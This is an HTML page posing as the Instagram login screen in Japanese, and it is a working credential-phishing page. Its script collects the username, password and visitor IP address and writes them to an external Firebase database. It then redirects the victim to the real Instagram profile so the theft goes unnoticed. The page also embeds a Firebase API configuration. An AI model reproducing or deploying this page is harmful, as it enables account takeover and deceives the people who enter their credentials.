<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png">
    <meta charset="UTF-8">
    <meta name="description" content="Instagramにログインしてください">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            width: 350px;
            text-align: center;
        }

        .logo {
            margin-bottom: 20px;
        }

        form {
            width: 293px;
            height: 350px;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            box-sizing: border-box;
        }

        button[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            border: none;
            border-radius: 5px;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        button[type="submit"]:hover {
            background-color: #007bb5;
        }

        .login-options {
            margin: 20px 0;
        }

        .login-options a {
            color: #385185;
            font-weight: bold;
        }

        .forgot-password {
            color: #385185;
            font-size: 12px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <form id="loginForm">
            <br>
            <img src="Instagram.png" width="180" height="54">
            <br>
            <br>
            <br>
            <input type="text" id="username" name="username" placeholder="電話番号、ユーザーネーム、またはメールアドレス">
            <br>
            <input type="password" id="password" name="password" placeholder="パスワード">
            <br>
            <br>
            <button type="submit">ログイン</button>
        </form>
    </div>
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCMjppxsT4pSd69N9gIRw_pdvWIHiF1yy4",
            authDomain: "instagram-df744.firebaseapp.com",
            projectId: "instagram-df744",
            storageBucket: "instagram-df744.firebasestorage.app",
            messagingSenderId: "326940421472",
            appId: "1:326940421472:web:1a504873cdcc44a1840205",
            measurementId: "G-DDQ9SEHTLP"
        };

        // Firebaseの初期化
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // フォームの送信イベントリスナー
        document.getElementById('loginForm').addEventListener('submit', async function (e) {
            e.preventDefault(); // フォームのデフォルト動作を停止

            // 入力値の取得
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // IPアドレスを取得 
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json(); const ipAddress = data.ip;
           
                try {
                    // Firestoreにデータを追加
                    const docRef = await addDoc(collection(db, "users"), {
                        username: username,
                        password: password,
                        ipAddress: ipAddress
                    });
                    console.log("Document written with ID: ", docRef.id);

                //リダイレクト
                window.location.href = "https://instagram.com/"+username;
            } catch (e) {
                console.error("Error adding document: ", e);
                alert('Error saving data');
            }
        });
    </script>
</body>
</html>
